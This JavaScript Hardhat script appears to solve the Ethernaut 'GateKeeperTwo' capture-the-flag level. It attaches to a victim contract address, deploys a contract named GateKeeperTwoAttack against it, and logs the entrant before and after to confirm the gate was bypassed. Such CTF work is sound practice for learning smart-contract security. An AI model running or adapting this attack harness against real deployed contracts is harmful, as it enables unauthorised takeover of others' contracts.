const hre = require("hardhat");

async function main() {
  const Victim = await ethers.getContractFactory("GateKeeperTwo");
  const victim = await Victim.attach(
    "0xdb65aa314A6b04C286ad5a4a2B4E897a4042D447" // This is the contract address that you get from starting your instance
  );

  // Check what the entrant address initially is
  const value1 = await victim.entrant();
  console.log("The last entrant is ", value1);

  // This is for the attacking contract
  const MyContract = await ethers.getContractFactory("GateKeeperTwoAttack");

  // Deploy contract
  const contract = await MyContract.deploy(
    "0xdb65aa314A6b04C286ad5a4a2B4E897a4042D447"
  );
  await contract.deployed();

  console.log(`Deployed contract to: ${contract.address}`);

  // Verify you were able to enter
  const value2 = await victim.entrant();
  console.log("The last entrant is ", value2);
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
